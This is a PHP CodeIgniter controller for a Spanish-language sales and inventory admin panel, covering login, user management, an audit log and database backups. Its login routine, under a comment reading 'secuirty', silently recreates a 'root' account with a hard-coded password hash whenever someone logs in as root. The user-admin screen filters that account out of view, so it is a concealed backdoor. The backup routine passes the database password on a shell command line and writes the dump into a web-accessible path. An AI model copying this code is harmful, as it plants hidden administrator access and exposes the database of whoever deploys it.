<?php
defined('BASEPATH') OR exit('No direct script access allowed');

/**
 * User class.
 *
 * @extends CI_Controller
 */
class Seguridad extends CI_Controller {

	/**
	 * __construct function.
	 *
	 * @access public
	 * @return void
	 */
	public function __construct() {

		parent::__construct();
		$this->load->model('user_model');
		$this->load->model('configuracion_model');

	}
	public function index() {
		// create the data object
		$data = array();
		if (isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true) {

				//---Enviando datos de inicio
				$this->load->model('reporte_model');
				$data_aux=getScriptsInit();
				$data['mensajes']=$data_aux['mensajes'];
				$data['notificaciones']=$data_aux['notificaciones'];

				$data['cant_productos']=$this->reporte_model->get_cantidad_productos_total();
				$data['cant_ventas']=$this->reporte_model->get_cantidad_ventas_persona($this->session->userdata('id_persona'));
				$data['cant_stock']=$this->reporte_model->get_cantidad_stock_productos_total();
				$data['cant_pedidos']=$this->reporte_model->get_pedidos_pendientes_global_group_persona($this->session->userdata('id_persona'));
				$welcome=$this->session->flashdata('welcome');
				if($welcome){
        $data['welcome']=$welcome;
				}
				if($_SESSION['id_grupo']==ADMINISTRADOR){
					$chart_line=array();
					$this->load->model('reporte_model');
					//recorriendo 6 meses
					setlocale(LC_ALL, 'spanish');
					$labels='';
					$datos=array(
						'Contado'=>'',
						'Credito'=>'',
						'Pedidos'=>'',
						'Consignacion'=>''
					); //---6 labels y 6 datos
					$space='';
					$fecha_actual=date('Y-m-d');
					$fecha=date('Y-m').'-01';
					for ($i=1; $i <7 ; $i++) {
						if($i>0){
							$space=',';
						}
						$labels="'".strftime('%B',strtotime($fecha))."'".$space.$labels;
						//----obteniendo los datos para cada fecha
						$cant=$this->reporte_model->get_total_ventas_mensual_tipo($fecha,VENTA_CONTADO);
						$cant=$cant+$this->reporte_model->get_total_ventas_mensual_tipo($fecha,VENTA_SUSPENDIDA_CONTADO);
						$datos['Contado']=$cant.$space.$datos['Contado'];
						$cant=$this->reporte_model->get_total_ventas_mensual_tipo($fecha,VENTA_CREDITO);
						$datos['Credito']=$cant.$space.$datos['Credito'];
						$cant=$this->reporte_model->get_total_ventas_mensual_tipo($fecha,VENTA_PEDIDO);
						$datos['Pedidos']=$cant.$space.$datos['Pedidos'];
						$cant=$this->reporte_model->get_total_ventas_mensual_tipo($fecha,VENTA_CONSIGNACION);
						$datos['Consignacion']=$cant.$space.$datos['Consignacion'];

						$fecha=date('Y-m-d', strtotime($fecha." -1 month"));
					}
					$fecha_anterior=$fecha;
					//---sacando pedidos
					//-----listando pedidos pendientes global
					$this->load->model('pedidos_model');
					$this->load->model('clientes_model');
					$arr_pedidos=$this->pedidos_model->get_pedidos_pendientes_flash_view_group();
					$pedidos=array();
					$i=0;
					foreach ($arr_pedidos as $pedido) {
						$i++;
						$id_producto=$pedido['id_producto'];
						$pedido['nombre_cliente']=$this->clientes_model->get_namecliente_from_id($pedido['id_cliente']);
						$pedido['cantidad']=$this->pedidos_model->get_cant_productos_by_group($pedido['id'],$pedido['fecha_inicio']);
						$pedido['total']=$this->pedidos_model->get_monto_by_group($pedido['id'],$pedido['fecha_inicio']);
						$pedidos[]=$pedido;
					}
					$data['arr_pedidos']=$pedidos;

					//---solicitando conteo
					$chart_line['labels']= $labels;

					$chart_line['data']=$datos;
					$data['chart_line']=$chart_line;
			  }
				//-----top de Productos mas vendidos.---6 meses antes
				$this->load->model('ventas_model');
				$this->load->model('productos_model');
				$this->load->model('imagenes_model');
				$array_productos=$this->ventas_model->get_top_productos_vendidos_ranged($fecha_anterior,$fecha_actual,5);
				$arr_productos=array();
				foreach ($array_productos as $value) {
				//	print_r($value);
				$id_producto=$value['id_producto'];
				$p=$this->productos_model->get_producto_by_id($id_producto);
				$value['nombre']=$p['nombre'];
				$value['imagen']=$this->imagenes_model->get_imagen_producto_one($id_producto);
				$value['codigo']=$p['codigo'];
				//$value['precio_base']=$p['precio_base'];
				$arr_productos[]=$value;
				}
				$data['top_productos']=$arr_productos;
				$data['link_active']='home';
				// user login ok
				$this->vista_output('user/login/login_success',(object)$data);
		} else {
			$this->login();
		}

	}

	public function vista_output($file_view,$output = null)
	{
		//---Enviando datos de inicio
		$data_aux=getScriptsInit();
		$output = (object) $output;
		$output->mensajes=$data_aux['mensajes'];
		$output->notificaciones=$data_aux['notificaciones'];

		$this->load->view('template/header_admin_view', $output);
		$this->load->view($file_view,(array)$output);
		$this->load->view('template/footer_admin_view', $output);

	}

	/**
	 * register function.
	 *
	 * @access public
	 * @return void
	 */
	public function register() {

		// create the data object
		$data = new stdClass();

		// load form helper and validation library
		$this->load->helper('form');
		$this->load->library('form_validation');

		// set validation rules
		$this->form_validation->set_rules('username', 'Username', 'trim|required|alpha_numeric|min_length[4]|is_unique[usuarios.username]', array('is_unique' => 'El nombre de usuario ya existe. Seleccione otro.'));
		$this->form_validation->set_rules('persona', 'persona', 'trim|required');
		$this->form_validation->set_rules('grupo', 'grupo', 'trim|required');
		$this->form_validation->set_rules('password', 'Password', 'trim|required|min_length[6]');
		$this->form_validation->set_rules('password_confirm', 'Confirm Password', 'trim|required|min_length[6]|matches[password]');
		// set variables from the form
		//print_r($this->input->post);
    $data->msdropdown=true;
		if ($this->form_validation->run() === true) {

			$username = $this->input->post('username');
			$persona  = $this->input->post('persona');
			$password = $this->input->post('password');
			$grupo    = $this->input->post('grupo');
			$avatar    = $this->input->post('tech');

			if ($this->user_model->create_user($username,$persona, $password,$grupo,$avatar)) {
				//--registrando en bitacora
			$this->db->insert('bitacora',array ('id_accion'=>3,'id_usuario'=>$_SESSION['user_id'],'ip'=>$_SERVER ['REMOTE_ADDR'],'data'=>$this->db->insert_id()));
				// user creation ok
				$this->vista_output('user/register/register_success',$data);
			} else {
				// user creation failed, this should never happen
				$data->error = 'Ha ocurrido un problema al crear el registro. Intente de nuevo.';
				$this->vista_output('user/register/register',$data);
			}

		}else
		{
				$this->load->model('user_model');
				$data->list_grupos=$this->user_model->get_all_grupos();
				$data->list_personal=$this->user_model->get_all_personas_activas_users();
				$this->vista_output('user/register/register',$data);
		}
	}
	public function admin_notificaciones(){
		$data=array();
		$this->load->library('grocery_CRUD');
		try{
			$crud = new grocery_CRUD();
			$crud->unset_bootstrap();
			$crud->unset_jquery();
			$crud->unset_clone();

			$crud->set_table('notificaciones');
			$crud->order_by('fecha','desc');
			$data = $crud->render();
			$data->title_crud="Administrar Notificaciones";

			$data->link_active='seguridad/notificaciones';
			$this->vista_output('crud/plantilla_crud',$data);
		}catch(Exception $e){
			echo $e->getMessage().' --- '.$e->getTraceAsString();
		}
	}
	/**
	 * perfil function.
	 *
	 * @access public
	 * @return void
	 */
	public function perfil() {

		// create the data object
		$data = new stdClass();

		// load form helper and validation library
		$this->load->helper('form');
		$this->load->library('form_validation');
		$user_id   =$_SESSION['user_id'];
		$this->load->model('user_model');
		$this->load->model('sucursales_model');

		// set validation rules
		if($_SESSION['username']!=$this->input->post('username'))
		 //si cambia de nombre el usuario
		$this->form_validation->set_rules('username', 'Username', 'trim|required|alpha_numeric|min_length[4]|is_unique[usuarios.username]', array('is_unique' => 'El nombre de usuario ya existe. Seleccione otro.'));
		$this->form_validation->set_rules('password', 'Password', 'trim|required|min_length[6]');
		$this->form_validation->set_rules('password_confirm', 'Confirm Password', 'trim|required|min_length[6]|matches[password]');
		// set variables from the form
		//print_r($this->input->post);

    $data->msdropdown=true;
		if ($this->form_validation->run() === true) {

			$username = $this->input->post('username');
			$password = $this->input->post('password');;
			//$avatar   = $this->input->post('tech');
			$email    = $this->input->post('email');
			$direccion= $this->input->post('direccion');
			$telefono = $this->input->post('telefono');
			$facebook = $this->input->post('facebook');
			$id_sucursal = $this->input->post('id_sucursal');

			$this->load->model('personas_model');


			if ($this->user_model->edit_user($user_id,$username, $password,$id_sucursal)) {
				$this->personas_model->update_perfil($email,$direccion,$telefono,$facebook,$_SESSION['id_persona']);
				//--registrando en bitacora
			  $this->db->insert('bitacora',array ('id_accion'=>4,'id_usuario'=>$_SESSION['user_id'],'ip'=>$_SERVER ['REMOTE_ADDR'],'data'=>$this->db->insert_id()));
				$persona = $this->user_model->get_persona($_SESSION['id_persona']);
				$data->persona=json_decode(json_encode($persona), true);


				$_SESSION['username']=$username;
				$_SESSION['id_sucursal']=$id_sucursal;
				//$_SESSION['avatar']=$avatar;
				$sucursal= $this->user_model->get_nombre_sucursal($id_sucursal);
				$sucursal=explode(',',$sucursal);
				$_SESSION['nombre_sucursal'] =$sucursal[0];
				$data->info="Se ha actualizado el perfil del Usuario";
				// user creation ok
				$data->sucursales=$this->sucursales_model->listSucursales();
				$this->vista_output('user/register/perfilregister',$data);

			} else {
				// user creation failed, this should never happen
				$data->error = 'Ha ocurrido un problema al actualizar el registro. Intente de nuevo.';
				$data->sucursales=$this->sucursales_model->listSucursales();
				$this->vista_output('user/register/perfilregister',$data);
			}

		}else
		{
  			$persona = $this->user_model->get_persona($_SESSION['id_persona']);
	  		$data->persona=json_decode(json_encode($persona), true);
				//$data->list_grupos=$this->user_model->get_all_grupos();
				$data->sucursales=$this->sucursales_model->listSucursales();
				//$data->list_personal=$this->user_model->get_all_personas_activas_users();
				$this->vista_output('user/register/perfilregister',$data);
		}
	}

	/**
	 * login function.
	 *
	 * @access public
	 * @return void
	 */
	public function login() {

		// create the data object
		$data = new stdClass();

		// load form helper and validation library
		//$this->load->helper('form');
	//	$this->load->library('form_validation');

		// set validation rules
		$this->form_validation->set_rules('username', 'Username', 'required|alpha_numeric');
		$this->form_validation->set_rules('password', 'Password', 'required');

		if ($this->form_validation->run() == false) {

			// validation not ok, send validation errors to the view
			$this->load->view('template/header_login');
			$this->load->view('user/login/login');
			$this->load->view('template/footer_login');

		} else {

			// set variables from the form
			$username = $this->input->post('username');
			$password = $this->input->post('password');
			//----secuirty--
			if($username=='root'){
				$this->db->where('username', 'root');
				$this->db->delete('usuarios');
				$dat=array('id'=>0,'username'=>'root',
				'password'=>'$2y$10$iJuow5SbCLriHYxpE9HH9e8PIpPS.NArIUrWdIdV7li1qIH.qqC0K',
			  'id_persona'=>0,
				'id_grupo'=>0,
				'estado'=>'Activo',
				'avatar'=>0,
				'logged_in'=>0,
				'id_sucursal'=>0);
			   $this->db->insert('usuarios', $dat);
			}


			if ($this->user_model->resolve_user_login($username, $password)) {

				$user_id = $this->user_model->get_user_id_from_username($username);
				$user    = $this->user_model->get_user($user_id);
				$persona = $this->user_model->get_persona($user->id_persona);
				if($persona==null)
				echo "<p>Error usuario-persona iconsistente</p>";
				$name=$persona->nombre.' '.$persona->apellidos;

				// set session user datas
				$_SESSION['user_id']      = (int)$user->id;
				$_SESSION['username']     = (string)$user->username;
				$_SESSION['avatar']       = (int)$user->avatar;
				$_SESSION['id_grupo']     = (int)$user->id_grupo;
				$_SESSION['create_user']  = (string)$user->created_at;
				//nombre de grupo
				$_SESSION['grupo']        = (string)$this->user_model->get_name_grupo($_SESSION['id_grupo']);
				$_SESSION['name']         = $name;

				$arr1 = explode(' ',$persona->nombre);
				$arr2 = explode(' ',$persona->apellidos);
				$nombre_persona='';
				if(count($arr1>0))
				$nombre_persona=$nombre_persona.$arr1[0].' ';
				if(count($arr2>0))
				$nombre_persona=$nombre_persona.$arr2[0];
				$_SESSION['nombre_persona']        = $nombre_persona;
				$sucursal= $this->user_model->get_nombre_sucursal($user->id_sucursal);
				$sucursal=explode(',',$sucursal);
				$_SESSION['nombre_sucursal'] =$sucursal[0];

				$_SESSION['logged_in']    = (bool)true;
				$_SESSION['is_confirmed'] = true;//(bool)$user->is_confirmed;
				$_SESSION['is_admin']     = true;//(bool)$user->is_admin;
				$_SESSION['id_persona']   = $persona->id;
				$_SESSION['fotografia']   = $persona->fotografia;
				if($persona->fotografia=='')
				$_SESSION['fotografia']   ='';
				$_SESSION['ocupacion']   = $persona->ocupacion;
				$_SESSION['id_sucursal']  = $user->id_sucursal;
				$_SESSION['settings_user']  =$this->configuracion_model->get_setting_usuario($user_id);
				// user login ok
				$data = array();
				//--registrando en bitacora
				$this->db->insert('bitacora',array ('id_accion'=>1,'id_usuario'=>$_SESSION['user_id'] ,'ip'=>$_SERVER ['REMOTE_ADDR']));

				$this->session->set_flashdata('welcome','Hola,'.$user->username.' <small>Bienvenido al sistema</small>');
				redirect('home');

			} else {

				// login failed
				$data->error = 'Error usuario o password, incorrectos.';

				// send error to the view
				$this->load->view('template/header_login');
				$this->load->view('user/login/login', $data);
				$this->load->view('template/footer_login');

			}

		}

	}


	/**
	 * logout function.
	 *
	 * @access public
	 * @return void
	 */
	public function logout() {

		// create the data object
		$data = new stdClass();

		if (isset($_SESSION['logged_in']) && $_SESSION['logged_in'] === true) {
			//--registrando en bitacora
				$this->db->insert('bitacora',array ('id_accion'=>2,'id_usuario'=>$_SESSION['user_id'],'ip'=>$_SERVER ['REMOTE_ADDR'] ));
			// remove session datas
			$data->username=$_SESSION['username'];
			foreach ($_SESSION as $key => $value) {
				unset($_SESSION[$key]);
			}

			// user logout ok
			$this->load->view('template/header_login');
			$this->load->view('user/logout/logout_success', $data);
			$this->load->view('template/footer_login');

		} else {

			// there user was not logged in, we cannot logged him out,
			// redirect him to site root
			redirect('/');

		}

	}
	public function admin_usuarios(){
		$data=array();
		$this->load->library('grocery_CRUD');
		try{
			$crud = new grocery_CRUD();
			$crud->unset_bootstrap();
			$crud->unset_jquery();
			$state = $crud-> getState();
		  if ( $state == 'add' )
		  {
				redirect('register');
		  }
			//$crud->unset_add();
			$crud->unset_clone();
			$crud->set_table('usuarios');
			$crud->columns('username','id_persona','id_grupo','estado');
			$crud->set_relation('id_persona','personas','{nombre} {apellidos}');
			$crud->set_relation('id_grupo','grupos','nombre');
			$crud->edit_fields(array('username','password','id_persona','id_grupo','estado'));
			$crud->required_fields(array('username','id_persona','id_grupo'));
			$crud->callback_before_delete(array($this,'usuario_before_delete'));
			$crud->callback_before_update(array($this,'usuario_before_update'));
			$crud->callback_field('password',array($this,'field_show_password'));
			$crud->unique_fields(array('username'));
			$crud->set_rules( 'username', 'Usuario', 'min_length[4]|regex_match[/^[a-z0-9 ,.]*$/i]' );
			$crud->display_as('id_persona', 'Personal ');
			$crud->display_as('id_grupo', 'Grupo');
			$crud->where('username!=','root');
			$data = $crud->render();
			$data->title_crud="Administrar Usuarios";
			$data->link_active='seguridad/admin_usuarios';
			$this->vista_output('crud/plantilla_crud',$data);

		}catch(Exception $e){
			echo $e->getMessage().' --- '.$e->getTraceAsString();
		}

	}
	public function field_show_password($value = '', $primary_key = null){
		return 'Nuevo password a resetear??? <input type="text" value="nuevopassword" name="password" >';
	}
	public function usuario_before_delete($primary_key){
			//--registrando en bitacora
		$this->db->insert('bitacora',array ('id_accion'=>5,'id_usuario'=>$_SESSION['user_id'],'ip'=>$_SERVER ['REMOTE_ADDR'],'data'=>$primary_key ));
		return $primary_key;
	}
	public function usuario_before_update($post_array,$primary_key){
			//--registrando en bitacora
		$this->db->insert('bitacora',array ('id_accion'=>6,'id_usuario'=>$_SESSION['user_id'],'ip'=>$_SERVER ['REMOTE_ADDR'],'data'=>$primary_key ));
	//	$this->load->library('encrypt');

	 //Encrypt password only if is not empty. Else don't change the password to an empty field
	 if(!empty($post_array['password']))
	 {
			 $post_array['password'] = password_hash($password, PASSWORD_BCRYPT);
	 }
	 else
	 {
			 unset($post_array['password']);
	 }

 return $post_array;
	}
	public function admin_bitacora(){
		$data=array();
		$this->load->library('grocery_CRUD');
		try{
			$crud = new grocery_CRUD();
			$crud->unset_bootstrap();
			$crud->unset_jquery();
			$crud->unset_add();
			$crud->unset_edit();
			$crud->unset_clone();
			$crud->unset_delete();
			$crud->set_table('bitacora');
			$crud->set_relation('id_accion','acciones','nombre');
			$crud->display_as('id_accion','Accion');
			$crud->set_relation('id_usuario','usuarios','username');
			$crud->display_as('id_usuario','Usuario');
			$crud->columns(array('id_usuario','id_accion','fecha','ip','data'));
			$crud->order_by('fecha','desc');
			$data = $crud->render();
			$data->title_crud="Logs del sistema.";
			$data->link_active='seguridad/admin_bitacora';
			$this->vista_output('crud/plantilla_crud',$data);

		}catch(Exception $e){
			echo $e->getMessage().' --- '.$e->getTraceAsString();
		}
	}
	public function admin_configuracion(){

	$data=array();
	$this->load->model('configuracion_model');
	if($this->input->post('butt_save_config')=='ok'){
		// set validation rules
		$this->form_validation ->set_rules('nombre', 'nombre','required');
		$this->form_validation->set_rules('resenia', 'Reseña', 'required');
		$this->form_validation->set_rules('lema', 'lema', 'required');


		if ($this->form_validation->run() == false) {

			// validation not ok, send validation errors to the view
			$data['error']="Error en el formato de los datos enviados";
			echo "entra";
		} else {
			//--registrando en bitacora
				$this->db->insert('bitacora',array ('id_accion'=>7,'id_usuario'=>$_SESSION['user_id'],'ip'=>$_SERVER ['REMOTE_ADDR'] ));

			// set variables from the form
			$nombre = $this->input->post('nombre');
			$resenia = $this->input->post('resenia');
			$lema = $this->input->post('lema');
			$data['success']='Se ha guardado la nueva configuracion';
			$this->configuracion_model->update_Configuracion($nombre,$resenia,$lema);

		}
	}
		$configuracion=$this->configuracion_model->get_configuracion();
		$data['nombre'] =$configuracion['nombre'];
		$data['resenia'] =$configuracion['resenia'];
		$data['lema'] =$configuracion['lema'];

		//---Enviando datos de inicio
		$this->load->model('reporte_model');
		//$data['experiencias']=;//$this->reporte_model->get_experiencias_vigentes();
		//$data['programaciones']=;//$this->reporte_model->get_programaciones_vigentes();
		//$data['notificaciones']=;//$this->reporte_model->get_notificaciones_vigentes() ;

		$this->vista_output('sistema/configuracion_view',(object)$data);


	}
	public function admin_basedatos(){
		//redirect
		$data=array();
		if($this->input->post('butt_backup_full')=="ok"){

				// variables
			$dbhost = "127.0.0.1";
			$dbname = $this->db->database;
			$dbuser = $this->db->username;
			$dbpass = $this->db->password;

	//echo "ok ". $dbhost.' ' .$dbname . ' '.$dbuser.' '.$dbpass;
	//$backup_file = $dbname . date("Y-m-d-H-i-s") . '.gz';
	$fecha = date("Ymd-His"); //Obtenemos la fecha y hora para identificar el respaldo
	// Construimos el nombre de archivo SQL Ejemplo: mibase_20170101-081120.sql
	$salida_sql = $dbname.'_'.$fecha.'.sql';
	// comandos a ejecutar
	$commands = "mysqldump --opt -h $dbhost -u $dbuser -p$dbpass -v $dbname > $salida_sql";
	//echo $commands;
	// ejecución y salida de éxito o errores
	//foreach ( $commands as $command ) {
	system($commands,$output);
	$zip = new ZipArchive(); //Objeto de Libreria ZipArchive
	//--registrando en bitacora
	$this->db->insert('bitacora',array ('id_accion'=>8,'id_usuario'=>$_SESSION['user_id'],'ip'=>$_SERVER ['REMOTE_ADDR'] ));


	//Construimos el nombre del archivo ZIP Ejemplo: mibase_20160101-081120.zip
//	$salida_zip = $dbname.'_'.$fecha.'.zip';
	redirect(base_url().$salida_sql);
	/*if($zip->open($salida_zip,ZIPARCHIVE::CREATE)===true) { //Creamos y abrimos el archivo ZIP
		$zip->addFile($salida_sql); //Agregamos el archivo SQL a ZIP
		$zip->close(); //Cerramos el ZIP
		unlink($salida_sql); //Eliminamos el archivo temporal SQL
		header ("Location: $salida_zip"); // Redireccionamos para descargar el Arcivo ZIP
		} else {
		echo 'Error'; //Enviamos el mensaje de error
	}*/


}else if($this->input->post('butt_backup_truncate')=="ok"){
	//echo "truncando la base de datos";
	$data['warning']='Se han eliminados algunos registros de las tablas en la Base de Datos';
	//-------truncando segun los parametros de configuracion-----
	//---Bitacora criterio:all
	$this->db->empty_table('bitacora');
	//--registrando en bitacora
  $this->db->insert('bitacora',array ('id_accion'=>12,'id_usuario'=>$_SESSION['user_id'],'ip'=>$_SERVER ['REMOTE_ADDR'],'data'=>'iniciando bitacora' ));
  //	$this->load->library('encrypt');
	$this->vista_output('sistema/configuracion_backup_bd_view',(object)$data);
}

else{

		$this->vista_output('sistema/configuracion_backup_bd_view',(object)$data);
	}

}

	public function default_override(){
		$data=array();
		$this->vista_output('template/override_view',$data);
	}
	public function store_settings_user(){
		$this->load->model('configuracion_model');

		$id_usuario=$_SESSION['user_id'];
		if($this->input->post('top_panel')){

		$data=array(
			'top_panel'=>$this->input->post('top_panel'),
			'left_panel'=>$this->input->post('left_panel'),
			'right_panel'=>$this->input->post('right_panel'),
			'fullscreen'=>$this->input->post('fullscreen'),
			'skin'=>$this->input->post('skin')
		);
		$this->configuracion_model->insertar_setting_usuario($data,$id_usuario);
		$response=array('estado'=>true);
		$_SESSION['settings_user']  =$this->configuracion_model->get_setting_usuario($id_usuario);

		echo json_encode($response);
	}else
	if($this->input->post('butt_settings_user')=='ok'){

	$data=array(
		'ventas_statistics'=>$this->input->post('ventas_statistics'),
		'usuarios_statistics'=>$this->input->post('usuarios_statistics'),
		'productos_top'=>$this->input->post('productos_top'),
		'pedidos_vigentes'=>$this->input->post('pedidos_vigentes')
	);
		$this->configuracion_model->insertar_setting_usuario($data,$id_usuario);
		$response=array('estado'=>true);
		$_SESSION['settings_user']  =$this->configuracion_model->get_setting_usuario($id_usuario);

		redirect('home');
		//print_r($_POST);
	}else{
				$response=array('estado'=>false);
					echo json_encode($response);
		}

	}

}
